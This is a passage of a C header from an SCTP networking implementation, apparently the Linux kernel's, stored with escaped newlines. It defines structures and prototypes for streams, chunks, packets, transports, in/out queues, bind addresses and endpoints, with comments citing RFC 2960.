len;\n};\n\nstruct sctp_ssnmap {\n\tstruct sctp_stream in;\n\tstruct sctp_stream out;\n\tint malloced;\n};\n\nstruct sctp_ssnmap *sctp_ssnmap_new(__u16 in, __u16 out,\n\t\t\t\t    gfp_t gfp);\nvoid sctp_ssnmap_free(struct sctp_ssnmap *map);\nvoid sctp_ssnmap_clear(struct sctp_ssnmap *map);\n\n/* What is the current SSN number for this stream? */\nstatic inline __u16 sctp_ssn_peek(struct sctp_stream *stream, __u16 id)\n{\n\treturn stream->ssn[id];\n}\n\n/* Return the next SSN number for this stream.\t*/\nstatic inline __u16 sctp_ssn_next(struct sctp_stream *stream, __u16 id)\n{\n\treturn stream->ssn[id]++;\n}\n\n/* Skip over this ssn and all below. */\nstatic inline void sctp_ssn_skip(struct sctp_stream *stream, __u16 id, \n\t\t\t\t __u16 ssn)\n{\n\tstream->ssn[id] = ssn+1;\n}\n              \n/*\n * Pointers to address related SCTP functions.\n * (i.e. things that depend on the address family.)\n */\nstruct sctp_af {\n\tint\t\t(*sctp_xmit)\t(struct sk_buff *skb,\n\t\t\t\t\t struct sctp_transport *);\n\tint\t\t(*setsockopt)\t(struct sock *sk,\n\t\t\t\t\t int level,\n\t\t\t\t\t int optname,\n\t\t\t\t\t char __user *optval,\n\t\t\t\t\t unsigned int optlen);\n\tint\t\t(*getsockopt)\t(struct sock *sk,\n\t\t\t\t\t int level,\n\t\t\t\t\t int optname,\n\t\t\t\t\t char __user *optval,\n\t\t\t\t\t int __user *optlen);\n\tint\t\t(*compat_setsockopt)\t(struct sock *sk,\n\t\t\t\t\t int level,\n\t\t\t\t\t int optname,\n\t\t\t\t\t char __user *optval,\n\t\t\t\t\t unsigned int optlen);\n\tint\t\t(*compat_getsockopt)\t(struct sock *sk,\n\t\t\t\t\t int level,\n\t\t\t\t\t int optname,\n\t\t\t\t\t char __user *optval,\n\t\t\t\t\t int __user *optlen);\n\tstruct dst_entry *(*get_dst)\t(struct sctp_association *asoc,\n\t\t\t\t\t union sctp_addr *daddr,\n\t\t\t\t\t union sctp_addr *saddr);\n\tvoid\t\t(*get_saddr)\t(struct sctp_sock *sk,\n\t\t\t\t\t struct sctp_association *asoc,\n\t\t\t\t\t struct dst_entry *dst,\n\t\t\t\t\t union sctp_addr *daddr,\n\t\t\t\t\t union sctp_addr *saddr);\n\tvoid\t\t(*copy_addrlist) (struct list_head *,\n\t\t\t\t\t  struct net_device *);\n\tvoid\t\t(*dst_saddr)\t(union sctp_addr *saddr,\n\t\t\t\t\t struct dst_entry *dst,\n\t\t\t\t\t __be16 port);\n\tint\t\t(*cmp_addr)\t(const union sctp_addr *addr1,\n\t\t\t\t\t const union sctp_addr *addr2);\n\tvoid\t\t(*addr_copy)\t(union sctp_addr *dst,\n\t\t\t\t\t union sctp_addr *src);\n\tvoid\t\t(*from_skb)\t(union sctp_addr *,\n\t\t\t\t\t struct sk_buff *skb,\n\t\t\t\t\t int saddr);\n\tvoid\t\t(*from_sk)\t(union sctp_addr *,\n\t\t\t\t\t struct sock *sk);\n\tvoid\t\t(*to_sk_saddr)\t(union sctp_addr *,\n\t\t\t\t\t struct sock *sk);\n\tvoid\t\t(*to_sk_daddr)\t(union sctp_addr *,\n\t\t\t\t\t struct sock *sk);\n\tvoid\t\t(*from_addr_param) (union sctp_addr *,\n\t\t\t\t\t    union sctp_addr_param *,\n\t\t\t\t\t    __be16 port, int iif);\n\tint\t\t(*to_addr_param) (const union sctp_addr *,\n\t\t\t\t\t  union sctp_addr_param *); \n\tint\t\t(*addr_valid)\t(union sctp_addr *,\n\t\t\t\t\t struct sctp_sock *,\n\t\t\t\t\t const struct sk_buff *);\n\tsctp_scope_t\t(*scope) (union sctp_addr *);\n\tvoid\t\t(*inaddr_any)\t(union sctp_addr *, __be16);\n\tint\t\t(*is_any)\t(const union sctp_addr *);\n\tint\t\t(*available)\t(union sctp_addr *,\n\t\t\t\t\t struct sctp_sock *);\n\tint\t\t(*skb_iif)\t(const struct sk_buff *sk);\n\tint\t\t(*is_ce)\t(const struct sk_buff *sk);\n\tvoid\t\t(*seq_dump_addr)(struct seq_file *seq,\n\t\t\t\t\t union sctp_addr *addr);\n\tvoid\t\t(*ecn_capable)(struct sock *sk);\n\t__u16\t\tnet_header_len;\n\tint\t\tsockaddr_len;\n\tsa_family_t\tsa_family;\n\tstruct list_head list;\n};\n\nstruct sctp_af *sctp_get_af_specific(sa_family_t);\nint sctp_register_af(struct sctp_af *);\n\n/* Protocol family functions. */\nstruct sctp_pf {\n\tvoid (*event_msgname)(struct sctp_ulpevent *, char *, int *);\n\tvoid (*skb_msgname)  (struct sk_buff *, char *, int *);\n\tint  (*af_supported) (sa_family_t, struct sctp_sock *);\n\tint  (*cmp_addr) (const union sctp_addr *,\n\t\t\t  const union sctp_addr *,\n\t\t\t  struct sctp_sock *);\n\tint  (*bind_verify) (struct sctp_sock *, union sctp_addr *);\n\tint  (*send_verify) (struct sctp_sock *, union sctp_addr *);\n\tint  (*supported_addrs)(const struct sctp_sock *, __be16 *);\n\tstruct sock *(*create_accept_sk) (struct sock *sk,\n\t\t\t\t\t  struct sctp_association *asoc);\n\tvoid (*addr_v4map) (struct sctp_sock *, union sctp_addr *);\n\tstruct sctp_af *af;\n};\n\n\n/* Structure to track chunk fragments that have been acked, but peer\n * fragments of the same message have not.\n */\nstruct sctp_datamsg {\n\t/* Chunks waiting to be submitted to lower layer. */\n\tstruct list_head chunks;\n\t/* Chunks that have been transmitted. */\n\tsize_t msg_size;\n\t/* Reference counting. */\n\tatomic_t refcnt;\n\t/* When is this message no longer interesting to the peer? */\n\tunsigned long expires_at;\n\t/* Did the messenge fail to send? */\n\tint send_error;\n\tchar send_failed;\n\t/* Control whether chunks from this message can be abandoned. */\n\tchar can_abandon;\n};\n\nstruct sctp_datamsg *sctp_datamsg_from_user(struct sctp_association *,\n\t\t\t\t\t    struct sctp_sndrcvinfo *,\n\t\t\t\t\t    struct msghdr *, int len);\nvoid sctp_datamsg_free(struct sctp_datamsg *);\nvoid sctp_datamsg_put(struct sctp_datamsg *);\nvoid sctp_chunk_fail(struct sctp_chunk *, int error);\nint sctp_chunk_abandoned(struct sctp_chunk *);\n\n/* RFC2960 1.4 Key Terms\n *\n * o Chunk: A unit of information within an SCTP packet, consisting of\n * a chunk header and chunk-specific content.\n *\n * As a matter of convenience, we remember the SCTP common header for\n * each chunk as well as a few other header pointers...\n */\nstruct sctp_chunk {\n\tstruct list_head list;\n\n\tatomic_t refcnt;\n\n\t/* This is our link to the per-transport transmitted list.  */\n\tstruct list_head transmitted_list;\n\n\t/* This field is used by chunks that hold fragmented data.\n\t * For the first fragment this is the list that holds the rest of\n\t * fragments. For the remaining fragments, this is the link to the\n\t * frag_list maintained in the first fragment.\n\t */\n\tstruct list_head frag_list;\n\n\t/* This points to the sk_buff containing the actual data.  */\n\tstruct sk_buff *skb;\n\n\t/* These are the SCTP headers by reverse order in a packet.\n\t * Note that some of these may happen more than once.  In that\n\t * case, we point at the \"current\" one, whatever that means\n\t * for that level of header.\n\t */\n\n\t/* We point this at the FIRST TLV parameter to chunk_hdr.  */\n\tunion sctp_params param_hdr;\n\tunion {\n\t\t__u8 *v;\n\t\tstruct sctp_datahdr *data_hdr;\n\t\tstruct sctp_inithdr *init_hdr;\n\t\tstruct sctp_sackhdr *sack_hdr;\n\t\tstruct sctp_heartbeathdr *hb_hdr;\n\t\tstruct sctp_sender_hb_info *hbs_hdr;\n\t\tstruct sctp_shutdownhdr *shutdown_hdr;\n\t\tstruct sctp_signed_cookie *cookie_hdr;\n\t\tstruct sctp_ecnehdr *ecne_hdr;\n\t\tstruct sctp_cwrhdr *ecn_cwr_hdr;\n\t\tstruct sctp_errhdr *err_hdr;\n\t\tstruct sctp_addiphdr *addip_hdr;\n\t\tstruct sctp_fwdtsn_hdr *fwdtsn_hdr;\n\t\tstruct sctp_authhdr *auth_hdr;\n\t} subh;\n\n\t__u8 *chunk_end;\n\n\tstruct sctp_chunkhdr *chunk_hdr;\n\tstruct sctphdr *sctp_hdr;\n\n\t/* This needs to be recoverable for SCTP_SEND_FAILED events. */\n\tstruct sctp_sndrcvinfo sinfo;\n\n\t/* Which association does this belong to?  */\n\tstruct sctp_association *asoc;\n\n\t/* What endpoint received this chunk? */\n\tstruct sctp_ep_common *rcvr;\n\n\t/* We fill this in if we are calculating RTT. */\n\tunsigned long sent_at;\n\n\t/* What is the origin IP address for this chunk?  */\n\tunion sctp_addr source;\n\t/* Destination address for this chunk. */\n\tunion sctp_addr dest;\n\n\t/* For outbound message, track all fragments for SEND_FAILED. */\n\tstruct sctp_datamsg *msg;\n\n\t/* For an inbound chunk, this tells us where it came from.\n\t * For an outbound chunk, it tells us where we'd like it to\n\t * go.\tIt is NULL if we have no preference.\n\t */\n\tstruct sctp_transport *transport;\n\n\t/* SCTP-AUTH:  For the special case inbound processing of COOKIE-ECHO\n\t * we need save a pointer to the AUTH chunk, since the SCTP-AUTH\n\t * spec violates the principle premis that all chunks are processed\n\t * in order.\n\t */\n\tstruct sk_buff *auth_chunk;\n\n#define SCTP_CAN_FRTX 0x0\n#define SCTP_NEED_FRTX 0x1\n#define SCTP_DONT_FRTX 0x2\n\t__u16\trtt_in_progress:1,\t/* This chunk used for RTT calc? */\n\t\tresent:1,\t\t/* Has this chunk ever been resent. */\n\t\thas_tsn:1,\t\t/* Does this chunk have a TSN yet? */\n\t\thas_ssn:1,\t\t/* Does this chunk have a SSN yet? */\n\t\tsingleton:1,\t\t/* Only chunk in the packet? */\n\t\tend_of_packet:1,\t/* Last chunk in the packet? */\n\t\tecn_ce_done:1,\t\t/* Have we processed the ECN CE bit? */\n\t\tpdiscard:1,\t\t/* Discard the whole packet now? */\n\t\ttsn_gap_acked:1,\t/* Is this chunk acked by a GAP ACK? */\n\t\tdata_accepted:1,\t/* At least 1 chunk accepted */\n\t\tauth:1,\t\t\t/* IN: was auth'ed | OUT: needs auth */\n\t\thas_asconf:1,\t\t/* IN: have seen an asconf before */\n\t\ttsn_missing_report:2,\t/* Data chunk missing counter. */\n\t\tfast_retransmit:2;\t/* Is this chunk fast retransmitted? */\n};\n\nvoid sctp_chunk_hold(struct sctp_chunk *);\nvoid sctp_chunk_put(struct sctp_chunk *);\nint sctp_user_addto_chunk(struct sctp_chunk *chunk, int off, int len,\n\t\t\t  struct iovec *data);\nvoid sctp_chunk_free(struct sctp_chunk *);\nvoid  *sctp_addto_chunk(struct sctp_chunk *, int len, const void *data);\nstruct sctp_chunk *sctp_chunkify(struct sk_buff *,\n\t\t\t\t const struct sctp_association *,\n\t\t\t\t struct sock *);\nvoid sctp_init_addrs(struct sctp_chunk *, union sctp_addr *,\n\t\t     union sctp_addr *);\nconst union sctp_addr *sctp_source(const struct sctp_chunk *chunk);\n\nenum {\n\tSCTP_ADDR_NEW,\t\t/* new address added to assoc/ep */\n\tSCTP_ADDR_SRC,\t\t/* address can be used as source */\n\tSCTP_ADDR_DEL,\t\t/* address about to be deleted */\n};\n\n/* This is a structure for holding either an IPv6 or an IPv4 address.  */\nstruct sctp_sockaddr_entry {\n\tstruct list_head list;\n\tstruct rcu_head\trcu;\n\tunion sctp_addr a;\n\t__u8 state;\n\t__u8 valid;\n};\n\ntypedef struct sctp_chunk *(sctp_packet_phandler_t)(struct sctp_association *);\n\n/* This structure holds lists of chunks as we are assembling for\n * transmission.\n */\nstruct sctp_packet {\n\t/* These are the SCTP header values (host order) for the packet. */\n\t__u16 source_port;\n\t__u16 destination_port;\n\t__u32 vtag;\n\n\t/* This contains the payload chunks.  */\n\tstruct list_head chunk_list;\n\n\t/* This is the overhead of the sctp and ip headers. */\n\tsize_t overhead;\n\t/* This is the total size of all chunks INCLUDING padding.  */\n\tsize_t size;\n\n\t/* The packet is destined for this transport address.\n\t * The function we finally use to pass down to the next lower\n\t * layer lives in the transport structure.\n\t */\n\tstruct sctp_transport *transport;\n\n\t/* pointer to the auth chunk for this packet */\n\tstruct sctp_chunk *auth;\n\n\tu8  has_cookie_echo:1,\t/* This packet contains a COOKIE-ECHO chunk. */\n\t    has_sack:1,\t\t/* This packet contains a SACK chunk. */\n\t    has_auth:1,\t\t/* This packet contains an AUTH chunk */\n\t    has_data:1,\t\t/* This packet contains at least 1 DATA chunk */\n\t    ipfragok:1,\t\t/* So let ip fragment this packet */\n\t    malloced:1;\t\t/* Is it malloced? */\n};\n\nstruct sctp_packet *sctp_packet_init(struct sctp_packet *,\n\t\t\t\t     struct sctp_transport *,\n\t\t\t\t     __u16 sport, __u16 dport);\nstruct sctp_packet *sctp_packet_config(struct sctp_packet *, __u32 vtag, int);\nsctp_xmit_t sctp_packet_transmit_chunk(struct sctp_packet *,\n                                       struct sctp_chunk *, int);\nsctp_xmit_t sctp_packet_append_chunk(struct sctp_packet *,\n                                     struct sctp_chunk *);\nint sctp_packet_transmit(struct sctp_packet *);\nvoid sctp_packet_free(struct sctp_packet *);\n\nstatic inline int sctp_packet_empty(struct sctp_packet *packet)\n{\n\treturn (packet->size == packet->overhead);\n}\n\n/* This represents a remote transport address.\n * For local transport addresses, we just use union sctp_addr.\n *\n * RFC2960 Section 1.4 Key Terms\n *\n *   o\tTransport address:  A Transport Address is traditionally defined\n *\tby Network Layer address, Transport Layer protocol and Transport\n *\tLayer port number.  In the case of SCTP running over IP, a\n *\ttransport address is defined by the combination of an IP address\n *\tand an SCTP port number (where SCTP is the Transport protocol).\n *\n * RFC2960 Section 7.1 SCTP Differences from TCP Congestion control\n *\n *   o\tThe sender keeps a separate congestion control parameter set for\n *\teach of the destination addresses it can send to (not each\n *\tsource-destination pair but for each destination).  The parameters\n *\tshould decay if the address is not used for a long enough time\n *\tperiod.\n *\n */\nstruct sctp_transport {\n\t/* A list of transports. */\n\tstruct list_head transports;\n\n\t/* Reference counting. */\n\tatomic_t refcnt;\n\tint\t dead;\n\n\t/* This is the peer's IP address and port. */\n\tunion sctp_addr ipaddr;\n\n\t/* These are the functions we call to handle LLP stuff.\t */\n\tstruct sctp_af *af_specific;\n\n\t/* Which association do we belong to?  */\n\tstruct sctp_association *asoc;\n\n\t/* RFC2960\n\t *\n\t * 12.3 Per Transport Address Data\n\t *\n\t * For each destination transport address in the peer's\n\t * address list derived from the INIT or INIT ACK chunk, a\n\t * number of data elements needs to be maintained including:\n\t */\n\t/* RTO\t       : The current retransmission timeout value.  */\n\tunsigned long rto;\n\n\t__u32 rtt;\t\t/* This is the most recent RTT.\t */\n\n\t/* RTTVAR      : The current RTT variation.  */\n\t__u32 rttvar;\n\n\t/* SRTT\t       : The current smoothed round trip time.\t*/\n\t__u32 srtt;\n\n\t/* RTO-Pending : A flag used to track if one of the DATA\n\t *\t\tchunks sent to this address is currently being\n\t *\t\tused to compute a RTT. If this flag is 0,\n\t *\t\tthe next DATA chunk sent to this destination\n\t *\t\tshould be used to compute a RTT and this flag\n\t *\t\tshould be set. Every time the RTT\n\t *\t\tcalculation completes (i.e. the DATA chunk\n\t *\t\tis SACK'd) clear this flag.\n\t * hb_sent : a flag that signals that we have a pending heartbeat.\n\t */\n\t__u8 rto_pending;\n\t__u8 hb_sent;\n\n\t/* Flag to track the current fast recovery state */\n\t__u8 fast_recovery;\n\n\t/*\n\t * These are the congestion stats.\n\t */\n\t/* cwnd\t       : The current congestion window.\t */\n\t__u32 cwnd;\t\t  /* This is the actual cwnd.  */\n\n\t/* ssthresh    : The current slow start threshold value.  */\n\t__u32 ssthresh;\n\n\t/* partial     : The tracking method for increase of cwnd when in\n\t * bytes acked : congestion avoidance mode (see Section 6.2.2)\n\t */\n\t__u32 partial_bytes_acked;\n\n\t/* Data that has been sent, but not acknowledged. */\n\t__u32 flight_size;\n\n\t__u32 burst_limited;\t/* Holds old cwnd when max.burst is applied */\n\n\t/* TSN marking the fast recovery exit point */\n\t__u32 fast_recovery_exit;\n\n\t/* Destination */\n\tstruct dst_entry *dst;\n\t/* Source address. */\n\tunion sctp_addr saddr;\n\n\t/* Heartbeat interval: The endpoint sends out a Heartbeat chunk to\n\t * the destination address every heartbeat interval.\n\t */\n\tunsigned long hbinterval;\n\n\t/* SACK delay timeout */\n\tunsigned long sackdelay;\n\t__u32 sackfreq;\n\n\t/* When was the last time (in jiffies) that we heard from this\n\t * transport?  We use this to pick new active and retran paths.\n\t */\n\tunsigned long last_time_heard;\n\n\t/* Last time(in jiffies) when cwnd is reduced due to the congestion\n\t * indication based on ECNE chunk.\n\t */\n\tunsigned long last_time_ecne_reduced;\n\n\t/* This is the max_retrans value for the transport and will\n\t * be initialized from the assocs value.  This can be changed\n\t * using SCTP_SET_PEER_ADDR_PARAMS socket option.\n\t */\n\t__u16 pathmaxrxt;\n\n\t/* is the Path MTU update pending on this tranport */\n\t__u8 pmtu_pending;\n\n\t/* PMTU\t      : The current known path MTU.  */\n\t__u32 pathmtu;\n\n\t/* Flags controlling Heartbeat, SACK delay, and Path MTU Discovery. */\n\t__u32 param_flags;\n\n\t/* The number of times INIT has been sent on this transport. */\n\tint init_sent_count;\n\n\t/* state       : The current state of this destination,\n\t *             : i.e. SCTP_ACTIVE, SCTP_INACTIVE, SCTP_UNKNOWN.\n\t */\n\tint state;\n\n\t/* These are the error stats for this destination.  */\n\n\t/* Error count : The current error count for this destination.\t*/\n\tunsigned short error_count;\n\n\t/* Per\t       : A timer used by each destination.\n\t * Destination :\n\t * Timer       :\n\t *\n\t * [Everywhere else in the text this is called T3-rtx. -ed]\n\t */\n\tstruct timer_list T3_rtx_timer;\n\n\t/* Heartbeat timer is per destination. */\n\tstruct timer_list hb_timer;\n\n\t/* Since we're using per-destination retransmission timers\n\t * (see above), we're also using per-destination \"transmitted\"\n\t * queues.  This probably ought to be a private struct\n\t * accessible only within the outqueue, but it's not, yet.\n\t */\n\tstruct list_head transmitted;\n\n\t/* We build bundle-able packets for this transport here.  */\n\tstruct sctp_packet packet;\n\n\t/* This is the list of transports that have chunks to send.  */\n\tstruct list_head send_ready;\n\n\tint malloced; /* Is this structure kfree()able? */\n\n\t/* State information saved for SFR_CACC algorithm. The key\n\t * idea in SFR_CACC is to maintain state at the sender on a\n\t * per-destination basis when a changeover happens.\n\t *\tchar changeover_active;\n\t *\tchar cycling_changeover;\n\t *\t__u32 next_tsn_at_change;\n\t *\tchar cacc_saw_newack;\n\t */\n\tstruct {\n\t\t/* An unsigned integer, which stores the next TSN to be\n\t\t * used by the sender, at the moment of changeover.\n\t\t */\n\t\t__u32 next_tsn_at_change;\n\n\t\t/* A flag which indicates the occurrence of a changeover */\n\t\tchar changeover_active;\n\n\t\t/* A flag which indicates whether the change of primary is\n\t\t * the first switch to this destination address during an\n\t\t * active switch.\n\t\t */\n\t\tchar cycling_changeover;\n\n\t\t/* A temporary flag, which is used during the processing of\n\t\t * a SACK to estimate the causative TSN(s)'s group.\n\t\t */\n\t\tchar cacc_saw_newack;\n\t} cacc;\n\n\t/* 64-bit random number sent with heartbeat. */\n\t__u64 hb_nonce;\n};\n\nstruct sctp_transport *sctp_transport_new(const union sctp_addr *,\n\t\t\t\t\t  gfp_t);\nvoid sctp_transport_set_owner(struct sctp_transport *,\n\t\t\t      struct sctp_association *);\nvoid sctp_transport_route(struct sctp_transport *, union sctp_addr *,\n\t\t\t  struct sctp_sock *);\nvoid sctp_transport_pmtu(struct sctp_transport *);\nvoid sctp_transport_free(struct sctp_transport *);\nvoid sctp_transport_reset_timers(struct sctp_transport *, int);\nvoid sctp_transport_hold(struct sctp_transport *);\nvoid sctp_transport_put(struct sctp_transport *);\nvoid sctp_transport_update_rto(struct sctp_transport *, __u32);\nvoid sctp_transport_raise_cwnd(struct sctp_transport *, __u32, __u32);\nvoid sctp_transport_lower_cwnd(struct sctp_transport *, sctp_lower_cwnd_t);\nvoid sctp_transport_burst_limited(struct sctp_transport *);\nvoid sctp_transport_burst_reset(struct sctp_transport *);\nunsigned long sctp_transport_timeout(struct sctp_transport *);\nvoid sctp_transport_reset(struct sctp_transport *);\nvoid sctp_transport_update_pmtu(struct sctp_transport *, u32);\n\n\n/* This is the structure we use to queue packets as they come into\n * SCTP.  We write packets to it and read chunks from it.\n */\nstruct sctp_inq {\n\t/* This is actually a queue of sctp_chunk each\n\t * containing a partially decoded packet.\n\t */\n\tstruct list_head in_chunk_list;\n\t/* This is the packet which is currently off the in queue and is\n\t * being worked on through the inbound chunk processing.\n\t */\n\tstruct sctp_chunk *in_progress;\n\n\t/* This is the delayed task to finish delivering inbound\n\t * messages.\n\t */\n\tstruct work_struct immediate;\n\n\tint malloced;\t     /* Is this structure kfree()able?\t*/\n};\n\nvoid sctp_inq_init(struct sctp_inq *);\nvoid sctp_inq_free(struct sctp_inq *);\nvoid sctp_inq_push(struct sctp_inq *, struct sctp_chunk *packet);\nstruct sctp_chunk *sctp_inq_pop(struct sctp_inq *);\nstruct sctp_chunkhdr *sctp_inq_peek(struct sctp_inq *);\nvoid sctp_inq_set_th_handler(struct sctp_inq *, work_func_t);\n\n/* This is the structure we use to hold outbound chunks.  You push\n * chunks in and they automatically pop out the other end as bundled\n * packets (it calls (*output_handler)()).\n *\n * This structure covers sections 6.3, 6.4, 6.7, 6.8, 6.10, 7., 8.1,\n * and 8.2 of the v13 draft.\n *\n * It handles retransmissions.\tThe connection to the timeout portion\n * of the state machine is through sctp_..._timeout() and timeout_handler.\n *\n * If you feed it SACKs, it will eat them.\n *\n * If you give it big chunks, it will fragment them.\n *\n * It assigns TSN's to data chunks.  This happens at the last possible\n * instant before transmission.\n *\n * When free()'d, it empties itself out via output_handler().\n */\nstruct sctp_outq {\n\tstruct sctp_association *asoc;\n\n\t/* Data pending that has never been transmitted.  */\n\tstruct list_head out_chunk_list;\n\n\tunsigned out_qlen;\t/* Total length of queued data chunks. */\n\n\t/* Error of send failed, may used in SCTP_SEND_FAILED event. */\n\tunsigned error;\n\n\t/* These are control chunks we want to send.  */\n\tstruct list_head control_chunk_list;\n\n\t/* These are chunks that have been sacked but are above the\n\t * CTSN, or cumulative tsn ack point.\n\t */\n\tstruct list_head sacked;\n\n\t/* Put chunks on this list to schedule them for\n\t * retransmission.\n\t */\n\tstruct list_head retransmit;\n\n\t/* Put chunks on this list to save them for FWD TSN processing as\n\t * they were abandoned.\n\t */\n\tstruct list_head abandoned;\n\n\t/* How many unackd bytes do we have in-flight?\t*/\n\t__u32 outstanding_bytes;\n\n\t/* Are we doing fast-rtx on this queue */\n\tchar fast_rtx;\n\n\t/* Corked? */\n\tchar cork;\n\n\t/* Is this structure empty?  */\n\tchar empty;\n\n\t/* Are we kfree()able? */\n\tchar malloced;\n};\n\nvoid sctp_outq_init(struct sctp_association *, struct sctp_outq *);\nvoid sctp_outq_teardown(struct sctp_outq *);\nvoid sctp_outq_free(struct sctp_outq*);\nint sctp_outq_tail(struct sctp_outq *, struct sctp_chunk *chunk);\nint sctp_outq_sack(struct sctp_outq *, struct sctp_sackhdr *);\nint sctp_outq_is_empty(const struct sctp_outq *);\nvoid sctp_outq_restart(struct sctp_outq *);\n\nvoid sctp_retransmit(struct sctp_outq *, struct sctp_transport *,\n\t\t     sctp_retransmit_reason_t);\nvoid sctp_retransmit_mark(struct sctp_outq *, struct sctp_transport *, __u8);\nint sctp_outq_uncork(struct sctp_outq *);\n/* Uncork and flush an outqueue.  */\nstatic inline void sctp_outq_cork(struct sctp_outq *q)\n{\n\tq->cork = 1;\n}\n\n/* These bind address data fields common between endpoints and associations */\nstruct sctp_bind_addr {\n\n\t/* RFC 2960 12.1 Parameters necessary for the SCTP instance\n\t *\n\t * SCTP Port:\tThe local SCTP port number the endpoint is\n\t *\t\tbound to.\n\t */\n\t__u16 port;\n\n\t/* RFC 2960 12.1 Parameters necessary for the SCTP instance\n\t *\n\t * Address List: The list of IP addresses that this instance\n\t *\thas bound.  This information is passed to one's\n\t *\tpeer(s) in INIT and INIT ACK chunks.\n\t */\n\tstruct list_head address_list;\n\n\tint malloced;\t     /* Are we kfree()able?  */\n};\n\nvoid sctp_bind_addr_init(struct sctp_bind_addr *, __u16 port);\nvoid sctp_bind_addr_free(struct sctp_bind_addr *);\nint sctp_bind_addr_copy(struct sctp_bind_addr *dest,\n\t\t\tconst struct sctp_bind_addr *src,\n\t\t\tsctp_scope_t scope, gfp_t gfp,\n\t\t\tint flags);\nint sctp_bind_addr_dup(struct sctp_bind_addr *dest,\n\t\t\tconst struct sctp_bind_addr *src,\n\t\t\tgfp_t gfp);\nint sctp_add_bind_addr(struct sctp_bind_addr *, union sctp_addr *,\n\t\t       __u8 addr_state, gfp_t gfp);\nint sctp_del_bind_addr(struct sctp_bind_addr *, union sctp_addr *);\nint sctp_bind_addr_match(struct sctp_bind_addr *, const union sctp_addr *,\n\t\t\t struct sctp_sock *);\nint sctp_bind_addr_conflict(struct sctp_bind_addr *, const union sctp_addr *,\n\t\t\t struct sctp_sock *, struct sctp_sock *);\nint sctp_bind_addr_state(const struct sctp_bind_addr *bp,\n\t\t\t const union sctp_addr *addr);\nunion sctp_addr *sctp_find_unmatch_addr(struct sctp_bind_addr\t*bp,\n\t\t\t\t\tconst union sctp_addr\t*addrs,\n\t\t\t\t\tint\t\t\taddrcnt,\n\t\t\t\t\tstruct sctp_sock\t*opt);\nunion sctp_params sctp_bind_addrs_to_raw(const struct sctp_bind_addr *bp,\n\t\t\t\t\t int *addrs_len,\n\t\t\t\t\t gfp_t gfp);\nint sctp_raw_to_bind_addrs(struct sctp_bind_addr *bp, __u8 *raw, int len,\n\t\t\t   __u16 port, gfp_t gfp);\n\nsctp_scope_t sctp_scope(const union sctp_addr *);\nint sctp_in_scope(const union sctp_addr *addr, const sctp_scope_t scope);\nint sctp_is_any(struct sock *sk, const union sctp_addr *addr);\nint sctp_addr_is_valid(const union sctp_addr *addr);\n\n\n/* What type of endpoint?  */\ntypedef enum {\n\tSCTP_EP_TYPE_SOCKET,\n\tSCTP_EP_TYPE_ASSOCIATION,\n} sctp_endpoint_type_t;\n\n/*\n * A common base class to bridge the implmentation view of a\n * socket (usually listening) endpoint versus an association's\n * local endpoint.\n * This common structure is useful for several purposes:\n *   1) Common interface for lookup routines.\n *\ta) Subfunctions work for either endpoint or association\n *\tb) Single interface to lookup allows hiding the lookup lock rather\n *\t   than acquiring it externally.\n *   2) Common interface for the inbound chunk handling/state machine.\n *   3) Common object handling routines for reference counting, etc.\n *   4) Disentangle association lookup from endpoint lookup, where we\n *\tdo not have to find our endpoint to find our association.\n *\n */\n\nstruct sctp_ep_common {\n\t/* Fields to help us manage our entries in the hash tables. */\n\tstruct hlist_node node;\n\tint hashent;\n\n\t/* Runtime type information.  What kind of endpoint is this? */\n\tsctp_endpoint_type_t type;\n\n\t/* Some fields to help us manage this object.\n\t *   refcnt   - Reference count access to this object.\n\t *   dead     - Do not attempt to use this object.\n\t *   malloced - Do we need to kfree this object?\n\t */\n\tatomic_t    refcnt;\n\tchar\t    dead;\n\tchar\t    malloced;\n\n\t/* What socket does this endpoint belong to?  */\n\tstruct sock *sk;\n\n\t/* This is where we receive inbound chunks.  */\n\tstruct sctp_inq\t  inqueue;\n\n\t/* This substructure includes the defining parameters of the\n\t * endpoint:\n\t * bind_addr.port is our shared port number.\n\t * bind_addr.address_list is our set of local IP addresses.\n\t */\n\tstruct sctp_bind_addr bind_addr;\n};\n\n\n/* RFC Section 1.4 Key Terms\n *\n * o SCTP endpoint: The logical sender/receiver of SCTP packets. On a\n *   multi-homed host, an SCTP endpoint is represented to its peers as a\n *   combination of a set of eligible destination transport addresses to\n *   which SCTP packets can be sent and a set of eligible source\n *   transport addresses from which SCTP packets can be received.\n *   All transport addresses used by an SCTP endpoint must use the\n *   same port number, but can use multiple IP addresses. A transport\n *   address used by an SCTP endpoint must not be used by another\n *   SCTP endpoint. In other words, a transport address is unique\n *   to an SCTP endpoint.\n *\n * From an implementation perspective, each socket has one of these.\n * A TCP-style socket will have exactly one association on one of\n * these.  An UDP-style socket will have multiple associations hanging\n * off one of these.\n */\n\nstruct sctp_endpoint {\n\t/* Common substructure for endpoint and association. */\n\tstruct sctp_ep_common base;\n\n\t/* Associations: A list of current associations and mappings\n\t *\t      to the data consumers for each association. This\n\t *\t      may be in the form of a hash table or other\n\t *\t      implementation dependent structure. The data\n\t *\t      consumers may be process identification\n\t *\t      information such as file descriptors, named pipe\n\t *\t      pointer, or table pointers dependent on how SCTP\n\t *\t      is implemented.\n\t */\n\t/* This is really a list of struct sctp_association entries. */\n\tstruct list_head asocs;\n\n\t/* Secret Key: A secret key used by this endpoint to compute\n\t *\t      the MAC.\tThis SHOULD be a cryptographic quality\n\t *\t      random number with a sufficient length.\n\t *\t      Discussion in [RFC1750] can be helpful in\n\t *\t      selection of the key.\n\t */\n\t__u8 secret_key[SCTP_HOW_MANY_SECRETS][SCTP_SECRET_SIZE];\n\tint current_key;\n\tint last_key;\n\tint key_changed_at;\n\n \t/* digest:  This is a digest of the sctp cookie.  This field is\n \t * \t    only used on the receive path when we try to validate\n \t * \t    that the cookie has not been tampered with.  We put\n \t * \t    this here so we pre-allocate this once and can re-use\n \t * \t    on every receive.\n \t */\n \t__u8 *digest;\n \n\t/* sendbuf acct. policy.\t*/\n\t__u32 sndbuf_policy;\n\n\t/* rcvbuf acct. policy.\t*/\n\t__u32 rcvbuf_policy;\n\n\t/* SCTP AUTH: array of the HMACs that will be allocated\n\t * we need this per association so that we don't serialize\n\t */\n\tstruct crypto_hash **auth_hmacs;\n\n\t/* SCTP-AUTH: hmacs for the endpoint encoded into parameter */\n\t struct sctp_hmac_algo_param *auth_hmacs_list;\n\n\t/* SCTP-AUTH: chunks to authenticate encoded into parameter */\n\tstruct sctp_chunks_param *auth_chunk_list;\n\n\t/* SCTP-AUTH: endpoint shared keys */\n\tstruct list_head endpoint_shared_keys;\n\t__u16 